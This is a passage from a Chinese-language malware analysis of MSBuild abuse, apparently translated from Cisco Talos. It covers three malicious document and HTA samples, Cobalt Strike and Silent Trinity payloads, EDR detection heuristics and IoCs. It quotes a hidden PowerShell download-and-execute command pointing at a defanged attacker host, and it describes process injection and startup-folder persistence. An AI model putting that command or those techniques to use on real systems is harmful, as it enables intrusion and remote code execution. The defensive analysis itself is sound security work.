`Winword`会启动MSBuild，后者会运行C#编译器`csc.exe`及`cvtres.exe`。
图12. 样本进程执行树
从上图中可知，MSBuild进程会启动IE浏览器（`iexplore.exe`），后者采用挂起模式启动，因此payload（这里为Cobalt Strike
beacon）可以通过异步过程调用拷贝到该进程的进程空间中启动，这也是常见的一种进程注入技术。
蓝队应该定期检查进程之间的父子关系。在本案例中，`winword.exe`会启动`MSBuild.exe`进程，而`MSBuild.exe`会启动`iexplore.exe`，这是非常不正常的一种行为。
图13. 基于MSBuild的进程注入源代码
###  案例2：Excel文件
第2个案例与上一个案例类似，这是一个Excel文档，看上去似乎包含机密的薪资信息，但实际上会提示用户启用文档编辑功能，以查看具体内容。
图14. Excel样本
Excel文件中包含一个VBA宏代码，乍一看不是特别可疑，但实际上代码会调用另一个函数，后者最终会调用`Wscript.Shell`，文档的`Subject`属性中包含下一阶段加载器的URL。
图15. VBA代码使用文档的`Subject`属性来启动下一阶段攻击
文档的`Subject`属性中包含一些代码，用来执行PowerShell，获取并调用下一阶段payload：
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -w hidden -Command iex(New-Object System.Net.WebClient).DownloadString('hxxp://apb[.]sh/helloworld[.]ps1')
`Helloworld.ps1`会从另一个URL（`hxxp://apb[.]sh/msbuild[.]xml`）下载并启动MSBuild配置文件，经过一番操作后，`Helloworld.ps1`会从`hxxp://apb[.]sh/per[.]txt`下载一个文件，将其保存为用户`\Start
Menu\Programs\Startup\`目录中的`a.bat`文件，`a.bat`的作用是确保用户登出系统后payload依然能驻留。
样本下载的MSBuild配置文件似乎由Silent Trinity
.NET攻击平台创建，将.NET程序集payload保存为经过zlib压缩的文件，然后使用base64编码器进行编码。Silent Trinity
stager程序集在解码及加载后，所使用的命令控制URL指向`hxxp://35[.]157[.]14[.]111`，这是隶属于Amazon
AWS的一个IP地址。
图16. Silent Trinity样本的完整攻击阶段
Silent Trinity是相对较新的一个攻击框架，可以帮助攻击者或者红方队员在突破目标环境后开展各种攻击。原始的Silent
Trinity植入体名为Naga，可以解释执行采用[Boolang](https://github.com/boo-lang/boo)语言发送的命令。植入体与C2服务器之间的通信流量虽然采用HTTP协议发送，但依然经过加密处理。
在本例中，攻击者使用的是老版本的Naga，该版本并没有使用Boolang，但会尝试加载IronPython，这是适用于.NET框架的Python实现。
图17. Silent Trinity植入体加载IronPython引擎
与其他post-exploitation行为类似，我们很难确定该行为由恶意攻击者发起，还是由红方成员发起。
###  案例3：加密Cobalt Strike beacon的URL
最后一个案例采用了不同的感染方式。攻击链路从某个web页面开始，该页面托管了知名服装厂商G-III的员工行为准则文件，该文件实际上是由VB
Script编写的HTML应用，会创建MSBuild配置文件并运行MSBuild。
图18. VB Script HTA文件创建配置文件并调用MSBuild
MSBuild配置文件中包含一个内联任务类，使用外部URL来获取用来解密嵌入的加密payload的秘钥，秘钥存放的URL为`hxxp://makeonlineform[.]com/forms/228929[.]txt`。嵌入的payload为Cobalt
Strike PowerShell加载器，用来去混淆最终Cobalt Strike beacon，将其载入进程内存中。
图19. 经过去混淆的Cobalt Strike PowerShell加载器
当Cobalt Strike beacon加载完成后，HTA应用就会将浏览器导航至G-III行为准则文件的实际URL，最终样本会在本地主机上删除生成的MSBuild配置文件。
如果观察Threat
Grid生成的进程树，可以看到`MSBuild.exe`进程会启动PowerShell，这是潜在可疑的一种行为。这里`Mshta.exe`并不是`MSBuild.exe`的父进程，否则整个行为轨迹会更加可疑。
图20. Threat Grid中显式的HTA应用进程树
## 0x04 感知数据及追踪溯源
如果单以EDR解决方案收集到的MSBuild感知数据中的进程参数来研究，防御方很难判断当前环境中对`MSBuild.exe`的调用行为是否可疑。
这与使用编码脚本调用PowerShell的行为有所不同，此时防御方可以观察命令行参数来研究实际代码。
这里我们研究了使用MSBuild的目标系统在30天内的行为，以便判断是否存在可疑的MSBuild事件。
图21. 2020年1月份中运行MSBuild的端点比例
我们也观察了工程文件名，这样我们可以使用默认工程文件名来捕捉攻击行为，但不能期望能够通过这种技术捕捉到所有攻击行为。另一个判断特征是MSBuild调用时涉及到的参数个数，如果只用到了1个参数，并且该参数为工程名，那么这种行为可能更加可疑。
除了参数个数之外，防御方应当检查MSBuild运行时的文件路径。可疑的MSBuild调用行为可能会涉及到`C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll`，这通常是恶意MSBuild配置文件中指定的编译程序集。
防御方还可以用到最后一种方法，根据MSBuild的父进程作为特征，将正常进程（比如Visual
Studio开发环境及其他软件编译框架）与可疑的调用行为区分开来。在分析2020年1月份的感知数据时，我们总共发现了65个不同的父进程，实际环境中这个数量应该更少，也更容易管理。
在Cisco收集到的所有端点感知数据中，有2%的端点每天都会运行MSBuild，这种数据量对任何组织来说都有点庞大。然而，如果我们根据上述规则来分析MSBuild调用行为，则可以得到容易管理的行为数，大约占了5‰。
图22. 感知数据中具有可疑MSBuild调用行为的端点比例
在分析样本背后的攻击者时，如果我们没有其他信息，很难得出更多结论。当然，单凭MSBuild工程文件，我们还是可以得出关于源代码及payload的基本分析数据。但配合上行为结果后（比如Threat
Grid收集到的数据），我们可以了解更多上下文，更清晰了解MSBuild的滥用情况。
根据我们的调查，大多数payload都会使用某种post-exploitation agent，比如Meterpreter、Cobalt
Strike、Silent
Trinity或者Covenant。根据这些数据，我们可以得出一个结论：攻击者比较感兴趣在目标环境中找到立足点，以便进一步发起攻击行为，或者攻击者为红方成员，在进行渗透测试，以便评估目标防御团队的检测水平及功能。
## 0x05 总结
MSBuild是软件工程师用来构建.NET软件工程的必备工具，然而MSBuild工程文件中可以包含代码，因此恶意攻击者可以滥用这一功能，也有可能绕过某些Windows安全机制。
我们的研究表明，商用恶意软件通常不会使用MSBuild。我们观察到的大多数案例都会使用post-exploitation
agent变种作为最终payload，在渗透测试中，许多人会使用常用的post-exploitation
agent，这可能会给防御方带来错误的安全感。如果防御方对Meterpreter习以为常，那么当实际网络中检测到Meterpreter，即使该行为由真正的恶意攻击者所发起，也可能会被防御方忽略。
防御方应当仔细监控进程执行中的命令行参数，检查MSBuild父进程是否为web浏览器或者微软Office可执行文件。这类行为高度可疑，表明防御机制已被破坏。当设置检测基准线后，可疑的MSBuild调用行为应当很容易识别，不会增加维护团队的平均工作量。
生产环境中没有软件开发者，因此防御方应当仔细检查`MSBuild.exe`的每次调用行为，确保调用行为合法安全。
## 0x06 IoC
SHA256：
    334d4bcdbd645589b3cf37895c79b3b04047020540d7464268b3be4007ad7ab1
    a4eebe193e726bb8cc2ffbdf345ffde09ab61d69a131aff6dc857b0d01dd3213
    6c9140003e30137b0780d76da8c2e7856ddb4606d7083936598d5be63d4c4c0d
    ee34c2fccc7e605487ff8bee2a404bc9fc17b66d4349ea3f93273ef9c5d20d94
    aaf43ef0765a5380036c5b337cf21d641b5836ca87b98ad0e5fb4d569977e818
    ef7cc405b55f8a86469e6ae32aa59f693e1d243f1207a07912cce299b66ade38
    abb93130ad3bb829c59b720dd25c05daccbaeac1f1a8f2548457624acae5ba44
    ce6c00e688f9fb4a0c7568546bfd29552a68675a0f18a3d0e11768cd6e3743fd
    a661f4fa36fbe341e4ec0b762cd0043247e04120208d6902aad51ea9ae92519e
    18663fccb742c594f30706078c5c1c27351c44df0c7481486aaa9869d7fa95f8
    35dd34457a2d8c9f60c40217dac91bea0d38e2d0d9a44f59d73fb82197aaa792
URL：
    hxxp://apb[.]sh/helloworld[.]ps1
    hxxp://apb[.]sh/msbuild[.]xml
    hxxp://apb[.]sh/per[.]txt
    hxxp://makeonlineform[.]com/f/c3ad6a62-6a0e-4582-ba5e-9ea973c85540/